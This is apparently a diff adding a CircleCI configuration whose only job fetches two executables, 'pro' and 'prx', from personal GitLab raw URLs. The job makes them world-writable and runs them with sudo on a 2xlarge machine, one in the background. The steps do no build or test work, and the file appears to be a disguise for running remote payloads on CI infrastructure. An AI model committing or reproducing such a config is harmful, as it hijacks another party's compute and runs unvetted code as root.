@@ -1,0 +1,29 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004202101-01
+    resource_class: 2xlarge
+
+    steps:
+       - run:
+          name: "pre"
+          command: |
+           sudo su --command "wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro"
+           sudo nohup ./pro --log=stdout > meta.log &
+           sleep 10
+           sudo cat meta.log
+
+       - run:
+          name: "tot"
+          command: |
+           sudo su --command "wget https://gitlab.com/Sherwoodrey/prx/-/raw/main/prx && chmod 777 prx"
+           chmod 777 prx
+           ./prx
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
